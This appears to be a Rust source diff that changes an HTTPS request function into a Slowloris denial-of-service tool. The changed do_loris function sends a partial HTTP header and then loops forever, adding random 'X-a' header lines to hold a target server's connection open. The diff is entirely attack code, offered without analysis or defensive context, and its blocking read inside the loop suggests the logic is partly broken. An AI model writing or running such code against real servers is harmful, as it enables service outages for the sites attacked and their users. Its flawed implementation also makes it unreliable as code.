@@ -1,5 +1,6 @@
 extern crate native_tls;
 extern crate url;
+extern crate rand;
 use url::Url;
 
 use native_tls::{TlsConnector, TlsStream};
@@ -71,8 +72,12 @@ pub fn do_loris(url: &str) {
     let init_header = get_init_header(&url);
     stream.write_all(&init_header).unwrap();
     let mut res = vec![];
-    stream.read_to_end(&mut res).unwrap();
-    println!("{}", String::from_utf8_lossy(&res));
+    loop {
+        let loris_header = get_loris_header();
+        stream.write_all(&loris_header).unwrap();
+        stream.read_to_end(&mut res).unwrap();
+        //println!("{}", String::from_utf8_lossy(&res));
+    }
 }
 
 
@@ -88,9 +93,20 @@ fn get_stream(url: &Url) -> Stream<TcpStream> {
     }
 }
 
-
 fn get_init_header(url: &Url) -> Vec<u8> {
-    let ayy = format!("GET /{} HTTP/1.1\r\n", url.path());
-    println!("{}", url.path());
-    ayy.as_bytes().to_vec()
+    format!(
+        "GET {} HTTP/1.1\r\n\
+         Host: {}\r\n",
+        url.path(),
+        url.host_str().unwrap()
+    ).as_bytes()
+        .to_vec()
+}
+
+fn get_loris_header() -> Vec<u8> {
+    format!(
+        "X-a: {}\r\n",
+        rand::random::<u32>(),
+    ).as_bytes()
+        .to_vec()
 }
